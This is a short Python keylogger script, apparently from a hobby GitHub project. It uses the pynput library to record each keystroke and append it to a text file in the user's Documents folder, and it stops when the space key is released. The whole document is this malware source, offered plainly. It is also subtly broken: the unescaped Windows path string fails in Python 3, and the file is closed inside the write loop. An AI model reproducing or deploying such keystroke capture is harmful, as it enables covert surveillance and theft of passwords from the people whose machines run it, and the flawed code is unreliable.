import pynput
from pynput.keyboard import Key, Listener

keys_information = "key_log.txt"

file_path = "C:\Users\GGPC\Documents\GitHub\KeyLogger"
extend = "\\"

count = 0
keys = []


def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")  # Replaces '' symbol in output to Hello instead of 'H''e''l''l''o'
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.space:  # Stops application when pressing space
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
